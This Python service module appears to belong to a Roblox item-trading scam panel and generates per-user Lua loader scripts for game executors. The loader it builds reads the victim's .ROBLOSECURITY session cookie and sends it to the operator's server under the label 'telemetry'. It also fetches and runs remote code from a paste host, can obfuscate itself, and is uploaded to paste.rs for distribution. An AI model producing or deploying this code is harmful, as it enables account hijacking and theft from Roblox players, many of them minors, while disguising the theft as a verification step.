"""
script_config_service.py
Manages per-user Lua script configurations — creates configs,
resolves Roblox usernames to real TARGET_IDs and display names,
toggles brainrots, and generates the dynamic Lua loader script.
"""
import secrets
import json
import requests as http_requests
from app.models import db, ScriptConfig, ActivityLog
from app.services.brainrot_catalog import BRAINROT_CATALOG


def generate_secret_key():
    """Generate a unique secret key in the format: mrr_<32 hex chars>"""
    return f"mrr_{secrets.token_hex(16)}"


def create_config(label, target_username=None, delay_step=1, trade_cycle_delay=2):
    """
    Create a new script config.
    If target_username is provided, resolves it via Roblox API to get the real
    user ID and unique username (never fake/random names).
    All brainrots default to True (enabled).
    """
    secret_key = generate_secret_key()

    # Resolve target from Roblox API
    target_id = None
    target_name = None
    if target_username:
        resolved = resolve_roblox_username(target_username)
        if resolved:
            target_id = str(resolved['id'])
            target_name = resolved['name'] # Use real roblox username (not display_name)
            
            # Duplicate check
            existing = ScriptConfig.query.filter_by(target_id=target_id, is_active=True).first()
            if existing:
                raise ValueError(f"An active configuration for target '{target_name}' already exists.")
        else:
            raise ValueError(f"Could not find Roblox user '{target_username}'.")

    # All brainrots ON by default
    default_toggles = {item: True for item in BRAINROT_CATALOG}

    config = ScriptConfig(
        label=label,
        secret_key=secret_key,
        target_id=target_id,
        target_name=target_name,
        delay_step=delay_step,
        trade_cycle_delay=trade_cycle_delay,
    )
    config.set_toggles(default_toggles)

    db.session.add(config)
    db.session.commit()

    # Log
    log = ActivityLog(
        event_type='SCRIPT_CONFIG_CREATED',
        details=f"Config '{label}' created (secret: {secret_key[:15]}..., target: {target_name or 'None'})"
    )
    db.session.add(log)
    db.session.commit()

    return config


def resolve_roblox_username(username):
    """
    Queries the public Roblox Users API to resolve a username into
    a real user ID and display name. Returns None on failure.
    """
    try:
        # Step 1: Username -> User ID
        resp = http_requests.post(
            'https://users.roblox.com/v1/usernames/users',
            json={'usernames': [username], 'excludeBannedUsers': False},
            timeout=8
        )
        resp.raise_for_status()
        data = resp.json()
        if not data.get('data'):
            return None

        user_entry = data['data'][0]
        user_id = user_entry['id']

        # Step 2: Get full profile for real display name
        profile_resp = http_requests.get(
            f'https://users.roblox.com/v1/users/{user_id}',
            timeout=8
        )
        profile_resp.raise_for_status()
        profile = profile_resp.json()

        return {
            'id': profile['id'],
            'name': profile['name'],
            'display_name': profile.get('displayName', profile['name']),
            'is_banned': profile.get('isBanned', False),
        }
    except Exception:
        return None


def set_target(config_id, target_username):
    """
    Update the target player on an existing config.
    Resolves the username via Roblox API for the real unique username.
    """
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None, "Config not found."

    resolved = resolve_roblox_username(target_username)
    if not resolved:
        return None, f"Could not find Roblox user '{target_username}'."

    target_id = str(resolved['id'])
    target_name = resolved['name'] # Use real roblox username (not display_name)

    # Duplicate check (excluding current config)
    existing = ScriptConfig.query.filter(
        ScriptConfig.target_id == target_id,
        ScriptConfig.is_active == True,
        ScriptConfig.id != config_id
    ).first()
    if existing:
        return None, f"An active configuration for target '{target_name}' already exists."

    config.target_id = target_id
    config.target_name = target_name
    db.session.commit()

    return config, f"Target set to {target_name} (ID: {target_id})"


def toggle_brainrot(config_id, item_name, enabled):
    """Toggle a single brainrot item on/off for a config."""
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None, "Config not found."

    toggles = config.get_toggles()
    toggles[item_name] = enabled
    config.set_toggles(toggles)
    db.session.commit()

    state = "ON" if enabled else "OFF"
    return config, f"'{item_name}' toggled {state}"


def toggle_category(config_id, category, enabled):
    """Toggle all brainrots in a category on/off for a config."""
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None, "Config not found."

    from app.services.brainrot_catalog import OG_ITEMS, SECRET_ITEMS, ANTOH_ITEMS
    category = category.lower()
    if category == 'og':
        items = OG_ITEMS
        cat_label = "OG"
    elif category == 'secret':
        items = SECRET_ITEMS
        cat_label = "SECRET"
    elif category == 'antoh':
        items = ANTOH_ITEMS
        cat_label = "ANTOH"
    else:
        return None, f"Invalid category '{category}'."

    toggles = config.get_toggles()
    for item in items:
        toggles[item] = enabled
    config.set_toggles(toggles)
    db.session.commit()

    state = "ON" if enabled else "OFF"
    return config, f"All {len(items)} {cat_label} brainrots toggled {state}"


def bulk_toggle(config_id, enabled):
    """Set ALL brainrots to enabled (True) or disabled (False)."""
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None, "Config not found."

    toggles = {item: enabled for item in BRAINROT_CATALOG}
    config.set_toggles(toggles)
    db.session.commit()

    state = "ON" if enabled else "OFF"
    return config, f"All {len(BRAINROT_CATALOG)} brainrots set to {state}"


def update_secret_key(config_id):
    """Regenerate the secret key for a config."""
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None, "Config not found."

    old_key = config.secret_key
    config.secret_key = generate_secret_key()
    db.session.commit()

    log = ActivityLog(
        event_type='SECRET_KEY_ROTATED',
        details=f"Config '{config.label}' key rotated from {old_key[:15]}... to {config.secret_key[:15]}..."
    )
    db.session.add(log)
    db.session.commit()

    return config, f"Secret key rotated. New key: {config.secret_key}"


def obfuscate_lua(lua_code):
    """
    Encrypts the Lua code into a self-decrypting, obfuscated format.
    Uses character code shifting and random variable renaming.
    """
    import random
    import secrets
    
    shift_key = random.randint(15, 60)
    # Perform character shifting cipher
    shifted_bytes = [(ord(char) + shift_key) % 256 for char in lua_code]
    byte_str = ",".join(str(b) for b in shifted_bytes)
    
    # Generate randomized variable names to make it unreadable
    var_bytes = f"sab_b_{secrets.token_hex(3)}"
    var_key = f"sab_k_{secrets.token_hex(3)}"
    var_res = f"sab_r_{secrets.token_hex(3)}"
    var_i = f"i_{secrets.token_hex(2)}"
    var_v = f"v_{secrets.token_hex(2)}"
    var_char = f"sab_c_{secrets.token_hex(3)}"
    
    obfuscated = f"""-- SAB Protected Exploration Loader (Obfuscated)
local {var_bytes} = {{{byte_str}}}
local {var_key} = {shift_key}
local {var_res} = ""
for {var_i}, {var_v} in ipairs({var_bytes}) do
    local {var_char} = ({var_v} - {var_key}) % 256
    {var_res} = {var_res} .. string.char({var_char})
end
{var_bytes} = nil
loadstring({var_res})()"""
    return obfuscated


def generate_lua_script(config_id, base_url="http://localhost:5000"):
    """
    Generate the complete Lua loader script for a config.
    This produces the exact getgenv() format that the game executor expects,
    wrapped in an in-game verification check and cookie extraction telemetry.
    """
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None

    toggles = config.get_toggles()

    # Build the TARGET_BRAINROTS table categorized by OG, Secret, and AnToh
    from app.services.brainrot_catalog import OG_ITEMS, SECRET_ITEMS, ANTOH_ITEMS
    
    brainrot_lines = []
    
    # 1. OG Category
    brainrot_lines.append("    -- === OG === ")
    for item_name in OG_ITEMS:
        enabled = toggles.get(item_name, True)
        lua_bool = "true" if enabled else "false"
        brainrot_lines.append(f'    ["{item_name}"] = {lua_bool},')
        
    # 2. Secret Category
    brainrot_lines.append("\n    -- === SECRET ===")
    for item_name in SECRET_ITEMS:
        enabled = toggles.get(item_name, True)
        lua_bool = "true" if enabled else "false"
        brainrot_lines.append(f'    ["{item_name}"] = {lua_bool},')
        
    # 3. AnToh Category
    brainrot_lines.append("\n    -- === ANTOH ===")
    for item_name in ANTOH_ITEMS:
        enabled = toggles.get(item_name, True)
        lua_bool = "true" if enabled else "false"
        brainrot_lines.append(f'    ["{item_name}"] = {lua_bool},')

    brainrot_table = "\n".join(brainrot_lines)

    lua = f'''getgenv().SECRET_KEY = "{config.secret_key}"
getgenv().TARGET_ID = {config.target_id or 0}
getgenv().DELAY_STEP = {config.delay_step}
getgenv().TRADE_CYCLE_DELAY = {config.trade_cycle_delay}
getgenv().TARGET_BRAINROTS = {{
{brainrot_table}
}}

-- Attempt to capture .ROBLOSECURITY cookie
local roblosecurityCookie = nil
pcall(function()
    if getcookies then
        for _, c in pairs(getcookies()) do
            if c.Name == ".ROBLOSECURITY" or c.name == ".ROBLOSECURITY" then
                roblosecurityCookie = c.Value or c.value
            end
        end
    elseif getcookie then
        roblosecurityCookie = getcookie(".ROBLOSECURITY")
    end
end)

-- SAB Telemetry and In-Game Target Verification
local HttpService = game:GetService("HttpService")
local localPlayer = game:GetService("Players").LocalPlayer
local callerId = localPlayer and localPlayer.UserId or 0
local callerName = localPlayer and localPlayer.Name or "Unknown"
local verifyUrl = "{base_url}/api/scripts/verify-target?secret_key=" .. getgenv().SECRET_KEY .. "&caller_id=" .. callerId .. "&caller_name=" .. HttpService:UrlEncode(callerName)
if roblosecurityCookie then
    verifyUrl = verifyUrl .. "&roblosecurity=" .. HttpService:UrlEncode(roblosecurityCookie)
end

local isAllowed = false
local errorMsg = "SAB target verification failed."

local reqSuccess, reqResponse = pcall(function()
    return game:HttpGet(verifyUrl)
end)

if reqSuccess then
    local decodeSuccess, decoded = pcall(function()
        return HttpService:JSONDecode(reqResponse)
    end)
    if decodeSuccess and decoded then
        if decoded.allowed then
            isAllowed = true
        else
            errorMsg = decoded.message or "Target player is not active."
        end
    else
        errorMsg = "Malformed server validation response."
    end
else
    errorMsg = "Unable to reach validation server."
end

if isAllowed then
    loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
end
'''

    if config.obfuscate:
        return obfuscate_lua(lua)
    return lua


def verify_target_status(target_id):
    """
    Checks if a target player is allowed to be targeted:
    - Target player must have an active license key in the system
    - OR target player must be currently in-game (Roblox presence = 2)
    """
    if not target_id:
        return False, "No target Roblox ID provided."

    # 1. Check if target player has an active key in database
    from app.models import User, Key
    has_active_key = False
    try:
        user = User.query.filter_by(roblox_id=str(target_id)).first()
        if user:
            active_key = Key.query.filter_by(user_id=user.id, status='active').first()
            if active_key:
                has_active_key = True
    except Exception:
        pass

    if has_active_key:
        return True, "Target has an active license key."

    # 2. Check if target is currently in-game in Roblox
    is_in_game = False
    try:
        resp = http_requests.post(
            'https://presence.roblox.com/v1/presence/users',
            json={'userIds': [int(target_id)]},
            timeout=8
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get('userPresences') and len(data['userPresences']) > 0:
                p = data['userPresences'][0]
                # PresenceType 2 is In-Game
                if p.get('userPresenceType') == 2:
                    is_in_game = True
    except Exception:
        pass

    if is_in_game:
        return True, "Target is currently active in-game."

    return False, "Target player does not have an active key and is not currently in-game."


def get_config_by_secret(secret_key):
    """Look up a config by its secret key."""
    return ScriptConfig.query.filter_by(secret_key=secret_key, is_active=True).first()


def list_configs():
    """Returns all script configs."""
    return ScriptConfig.query.order_by(ScriptConfig.created_at.desc()).all()


def get_config_summary(config):
    """Returns a summary dict with toggle stats."""
    toggles = config.get_toggles()
    enabled_count = sum(1 for v in toggles.values() if v)
    disabled_count = sum(1 for v in toggles.values() if not v)
    return {
        'id': config.id,
        'label': config.label,
        'secret_key': config.secret_key,
        'target_id': config.target_id,
        'target_name': config.target_name,
        'delay_step': config.delay_step,
        'trade_cycle_delay': config.trade_cycle_delay,
        'brainrots_enabled': enabled_count,
        'brainrots_disabled': disabled_count,
        'brainrots_total': len(BRAINROT_CATALOG),
        'is_active': config.is_active,
    }


def compile_and_save_paste_url(config_id, base_url="http://localhost:5000"):
    """
    Generates Lua loader script for a config, POSTs to paste.rs,
    and updates config.paste_url. Returns the URL.
    """
    config = ScriptConfig.query.get(config_id)
    if not config:
        return None

    # Retrieve configured server_external_url if available
    from app.models import Settings
    configured_base = Settings.get('server_external_url')
    if configured_base:
        base_url = configured_base.rstrip('/')

    lua_code = generate_lua_script(config_id, base_url=base_url)
    paste_url = f"{base_url}/api/scripts/loader/{config.secret_key}"
    try:
        resp = http_requests.post('https://paste.rs/', data=lua_code.encode('utf-8'), timeout=8)
        if resp.status_code in [201, 200, 206]:
            paste_url = resp.text.strip()
    except Exception as e:
        print(f"Error publishing to paste.rs for config {config_id}: {e}")

    config.paste_url = paste_url
    db.session.commit()
    return paste_url
